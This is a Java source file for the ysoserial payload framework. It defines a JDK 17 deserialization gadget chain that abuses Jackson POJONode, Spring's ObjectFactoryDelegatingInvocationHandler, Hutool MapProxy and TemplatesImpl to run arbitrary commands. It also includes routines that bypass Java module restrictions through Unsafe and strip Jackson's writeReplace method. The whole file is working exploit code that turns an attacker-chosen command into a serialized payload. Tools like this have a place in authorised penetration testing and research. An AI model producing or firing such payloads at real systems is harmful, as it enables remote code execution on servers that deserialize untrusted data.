package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavassistHelper;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * JDK17 链（二次代理 MapProxy 版）。
 *
 * 触发链：
 *   Hashtable.readObject -> hash碰撞 -> POJONode.toString -> jackson getter
 *   -> ObjectFactoryDelegatingInvocationHandler.invoke (外层: 反射转发)
 *     -> objectFactory.getObject()
 *       -> MapProxy.invoke (内层: 数据容器) -> map.get("object") -> TemplatesImpl
 *     -> method.invoke(TemplatesImpl, args) -> getOutputProperties -> RCE
 *
 * 二次代理结构:
 *   外层 ObjectFactoryDelegatingInvocationHandler (反射转发载体)
 *   内层 MapProxy (数据容器, getObject -> "object" 取 map 值)
 *
 * command 参数支持：
 *   命令_xString           -> 使用 XStringForChars 构造 hash 碰撞
 *   命令_xxx_xxx           -> 三段时选择高版本 Spring-beans 的 serialVersionUID
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
    "com.fasterxml.jackson.core:jackson-databind:2.10+",
    "org.springframework:spring-beans:5.x",
    "cn.hutool:hutool-core:5.x"
})
@Authors({Authors.Unam4})
public class Jdk17MapProxyChain implements ObjectPayload<Object> {

    private Object inv;

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jdk17MapProxyChain.class, args);
    }

    public Object getObject(final String command) throws Exception {
        Boolean xs = false;
        String obj = "";
        String serialVersionUID = "-8835275493235412717";
        if (command.contains("_")) {
            String[] s = command.split("_");
            obj = s[0];
            if (s[1].equals("xString")) {
                xs = true;
            }
            if (s.length == 3 && s[2] != null) {
                // @Choice(label = "低版本Spring-beans <5.3 -8835275493235412717", value = "-8835275493235412717"),
                // @Choice(label = "高版本Spring-beans >=5.3 -1515767093960859525", value = "-1515767093960859525"),
                serialVersionUID = "-1515767093960859525";
            }
        } else {
            obj = command;
        }

        bypassModule(Jdk17MapProxyChain.class);
        removeWriteReplace();

        Object templates = Gadgets.createTemplatesImpl(obj);

        // 内层: MapProxy(map={"object": TemplatesImpl})
        Class<?> mapProxyClass = Class.forName("cn.hutool.core.map.MapProxy");
        Object mapProxy = Reflections.createWithoutConstructor(mapProxyClass);
        Map<Object, Object> innerMap = new HashMap<>();
        innerMap.put("object", templates);   // getObject() -> "object" -> templates
        Reflections.setFieldValue(mapProxy, "map", innerMap);

        // 用 MapProxy 代理 ObjectFactory 接口
        Class<?> objectFactoryClass = Class.forName("org.springframework.beans.factory.ObjectFactory");
        Object objectFactory = Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class<?>[]{ objectFactoryClass },
            (InvocationHandler) mapProxy);

        // 外层: ObjectFactoryDelegatingInvocationHandler(objectFactory=上面的代理)
        if ("-1515767093960859525".equals(serialVersionUID)) {
            JavassistHelper helper = new JavassistHelper(
                "org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
            helper.setSerialVersionUID("-1515767093960859525");
            CtClass ofdihCt = JavassistHelper.getCtClass();
            Class<?> ofdihCls = ofdihCt.toClass(new URLClassLoader(new URL[0]), null);
            inv = Reflections.createWithoutConstructor(ofdihCls);
            ofdihCt.defrost();
        } else {
            inv = Reflections.createWithoutConstructor(
                "org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler");
        }
        Reflections.setFieldValue(inv, "objectFactory", objectFactory);

        // 用 ofdih 代理 Templates 接口
        Object proxy = Proxy.newProxyInstance(
            Thread.currentThread().getContextClassLoader(),
            new Class<?>[]{ Templates.class },
            (InvocationHandler) inv);

        // jackson POJONode 触发
        POJONode node = new POJONode(proxy);

        if (xs) {
            return table2tostringByXString(node);
        }
        return table2tostring(node);
    }

    /** 触发 hash 碰撞 -> equals -> toString（Hashtable + UIDefaults$TextAndMnemonicHashMap） */
    private static Hashtable table2tostring(Object o) throws Exception {
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        Reflections.setAccessible(constructor);

        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Object tnode1 = constructor.newInstance(0, o, null, null);
        Reflections.setFieldValue(tHashMap1, "size", 2);
        Object tarr = Array.newInstance(node, 2);
        Array.set(tarr, 0, tnode1);
        Array.set(tarr, 1, tnode1);
        Reflections.setFieldValue(tHashMap1, "table", tarr);
        Object tnode2 = constructor.newInstance(0, o, null, null);
        Reflections.setFieldValue(tHashMap2, "size", 2);
        Object tarr2 = Array.newInstance(node, 2);
        Array.set(tarr2, 0, tnode2);
        Array.set(tarr2, 1, tnode2);
        Reflections.setFieldValue(tHashMap2, "table", tarr2);
        Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
        Reflections.setFieldValue(tHashMap2, "loadFactor", 1);

        Hashtable hashtable = new Hashtable();
        Reflections.setFieldValue(hashtable, "count", 2);
        Class<?> nodeE = Class.forName("java.util.Hashtable$Entry");
        Constructor<?> nodeEons = nodeE.getDeclaredConstructor(int.class, Object.class, Object.class, nodeE);
        Reflections.setAccessible(nodeEons);
        Object tbl = Array.newInstance(nodeE, 2);
        Array.set(tbl, 0, nodeEons.newInstance(0, tHashMap1, "Unam4", null));
        Array.set(tbl, 1, nodeEons.newInstance(0, tHashMap2, "Springkill", null));
        Reflections.setFieldValue(hashtable, "table", tbl);
        return hashtable;
    }

    /** xString 分支：使用 XStringForChars 构造 hash 碰撞（复用 Gadgets.makeMap） */
    private static HashMap table2tostringByXString(Object o) throws Exception {
        Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
        Object xString = Reflections.createWithoutConstructor(aClass1);
        Reflections.setFieldValue(xString, "m_obj", new char[]{});
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();
        hashMap1.put("zZ", xString);
        hashMap1.put("yy", o);
        hashMap2.put("yy", xString);
        hashMap2.put("zZ", o);
        return Gadgets.makeMap(hashMap1, hashMap2);
    }

    /** 绕过 JDK9+ 模块系统限制（Unsafe 方式） */
    private static void bypassModule(Class<?> targetClass) {
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, targetClass, offset, module);
        } catch (Exception ignored) {
        }
    }

    /** 移除 BaseJsonNode.writeReplace，避免 POJONode 序列化时被替换 */
    private static void removeWriteReplace() throws Exception {
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
    }
}
